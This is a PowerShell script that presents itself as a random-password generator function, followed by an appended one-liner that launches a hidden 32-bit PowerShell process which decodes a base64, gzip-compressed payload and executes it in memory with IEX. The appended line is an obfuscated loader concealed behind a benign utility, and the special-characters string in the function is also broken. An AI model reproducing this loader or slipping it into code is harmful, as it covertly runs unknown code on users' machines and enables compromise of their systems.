









function Get-RandomPassword
{
	[CmdletBinding(DefaultParameterSetName='NoClipboard')]
	param(
		[Parameter(
			Position=0,
			HelpMessage='Length of the Password  (Default=8)')]
		[ValidateScript({
			if($_ -eq 0)
			{
				throw "Length of the password can not be 0!"
			}
			else 
			{
				return $true	
			}
		})]
		[Int32]$Length=8,

		[Parameter(
			ParameterSetName='NoClipboard',
			Position=1,
			HelpMessage='Number of Passwords to be generated (Default=1)')]
		[ValidateScript({
			if($_ -eq 0)
			{
				throw "Number of Passwords to be generated can not be 0"
			}
			else 
			{
				return $true
			}
		})]
		[Int32]$Count=1,

		[Parameter(
			ParameterSetName='Clipboard',
			Position=1,
			HelpMessage='Copy password to clipboard')]
		[switch]$CopyToClipboard,

		[Parameter(
			Position=2,
			HelpMessage='Use lower case characters (Default=$true')]
		[switch]$DisableLowerCase,

		[Parameter(
			Position=3,
			HelpMessage='Use upper case characters (Default=$true)')]
		[switch]$DisableUpperCase,
		
		[Parameter(
			Position=4,
			HelpMessage='Use upper case characters (Default=$true)')]
		[switch]$DisableNumbers,

		[Parameter(
			Position=5,
			HelpMessage='Use upper case characters (Default=$true)')]
		[ValidateScript({
			if($DisableLowerCase -and $DisableUpperCase -and $DisableNumbers -and $_)
			{
				throw "Select at least 1 character set (lower case, upper case, numbers or special chars) to create a password."
			}
			else 
			{
				return $true
			}
		})]
		[switch]$DisableSpecialChars
	)

	Begin{

	}

	Process{
		$Character_LowerCase = "abcdefghiklmnprstuvwxyz"
		$Character_UpperCase = "ABCDEFGHKLMNPRSTUVWXYZ"
		$Character_Numbers = "0123456789"
		$Character_SpecialChars = "$%&/()=?+*

		$Characters = [String]::Empty
			
		
		if($DisableLowerCase -eq $false)
		{
			$Characters += $Character_LowerCase
		}

		if($DisableUpperCase -eq $false)
		{
			$Characters += $Character_UpperCase
		}

		if($DisableNumbers -eq $false)
		{
			$Characters += $Character_Numbers
		}
		
		if($DisableSpecialChars -eq $false)
		{
			$Characters += $Character_SpecialChars
		}
		
		for($i = 1; $i -ne $Count + 1; $i++)
		{
			$Password = [String]::Empty
					
			
			while($Password.Length -lt $Length)
			{
				
				$RandomNumber = Get-Random -Maximum $Characters.Length
				$Password += $Characters[$RandomNumber]
			}
			
			
			if($Count -eq 1)
			{
				
				if($CopyToClipboard)
				{
					Set-Clipboard -Value $Password
				}

				[pscustomobject] @{
					Password = $Password
				}
			}
			else 
			{
				[pscustomobject] @{
					Count = $i
					Password = $Password
				}	
			}
		}
	}

	End{
		
	}
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIrXPlgCA7VW+2/iOBD+uSvt/xCtkEh0FAjQdlup0iW8ElooEBJei1Zu4hCDidPE4bW3//tNeLRU3a56d7qICNsz4xl/840nbuzbnDBf8Hn0cKdT4cfnT2dtFKKFIKZCpczMIHjKCKnwobNpBW3p7AzkqYUaI9rXStfCrSCOlSCosAUi/uTmphyHIfb5fp6tY65EEV48UoIjURL+EvoeDvH5w+MM21z4IaS+Z+uUPSJ6UNuUke1h4VzxnUR2z2yURJc1Akq4mP72LS2Nz+VJtvoEAURi2thEHC+yDqVpSfgpJQ57mwCL6SaxQxYxl2f7xC8WsqYfIRe3YLclbmLuMSdKS3AU+IWYx6EvvBwq2WWvI6Zh2A6ZrThOiCMwyer+ks2xmPJjSjPCn+L4EEI39jlZYJBzHLLAwOGS2DjKash3KO5idyK28Op48o8aiadGoNXmoZSBzLwXa5M5McV787T0NtrnlErwnKQVoPj5+dPnT+6RDqjVrBWuLDZonTICRmfj3RhDwGKbRWSnfSvkM0ITvCLOwg1MU70wxtJEGCfZGE8mQmrVr86sCK1m28z7u8hHEzDYMDeApbHFiDMBk0O2UlO52osSwfu0q2CX+Liy8dGC2Edmib/CH7sU7w6cPaq1ICoxfRBgp4IpniKegJkRxm/NqgvCn23VmFAHh4oNOYwgKkiv9DqYfX7EtO438QKg2s/TkAkX+IyP2gcOb47ekzkopcsURVFGaMdQUHZGMDCi2MkIih+Rg0iJOdsN0y/hNmPKiY0iftxuIj0DeXBYZn7Ew9iG9MHhe0aAbYJogkVG0IiD1Y1BpkfH6V8iUUaUEn8KOy0hE7CSIGDwhBQhxHhCAClrYK4vAooXoLkr8BpFUyjnQz3suISm2Em/CfTI9T2xE0yOYJyECYk2KOMZwSIhh0JJ8E3o9F+iOLko9vGUQ3zIjHisnrG64QnbU7HRrT9pCUkPOO1QCTkgUgvZQkURviwZPAS8xC+5B1JW4BnqPm3a6pzIyorIehNekxR1Vrly7hozLRdW1p6r6JHe1NqVjqaVlg3DKnGjqvO7ts6b1cFsZiha1xzyka5oPZKfD0vboEG2xr3iDNe5y626XeXV9XY2ddxhxXWnV67RlS9q5L5f7qj5ArqvVOP7vrpS86WoSlZah5ideaPGH4cWRaabmw7ka0TW9+HMktnjwsorda+I+heBVfeazmao5a7NdUFu9Ux4USXoY+TmZAvGU1grEFVbKcrlnZkcd2nMWzWjbhX69eCiq7Gi3R+tHwtf5WGx1XDypW1z7hWatLt91BTFrHsDMsrVc9f9xpq2mFK5n3q1xI/Tsxaz0DJKVyDro2ngIl3ZKkq5UaqzqllnrrXw5G5wCbbWLi5rMeWq5yX6tZVm6r3iYHRZnUNI6lOnPlWqMELwdhS1h2pkbv4xyMkj8FXyfaswVXSQmfKIVQPUKC1zlmer+W0p0hT7AfYb0H6z5V5qbi6X+7oe9jrxqN6N7c1FPBp0lDhXlhkdPSm1dk7u3N5+SagF3ErFphJ/1zt2vGyvT3jzXoNoojDyEAU+waV/LOsaC2uH+7vNSGIhise2Psehjyk0QmiVx7JQKGV20k5OLntoaPs2M4EiN2FYLPxyJAnPitJLnzku3dyMIFwot30hZO+xP+VeJr8u5vPQKfLrUh4O/vFDllmwEQ+bZZJe8wqvFz9050dKajGFigM+JJvvD/87nIebwIM/52Nwvqz9RvohiPOZ11C8Eb9e+Eeo/xss+ohwUDbgZqN432x/B8mBTCdfKs9pA7a4hyf5cHyI+XkLvmL+BgmfwO6xCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
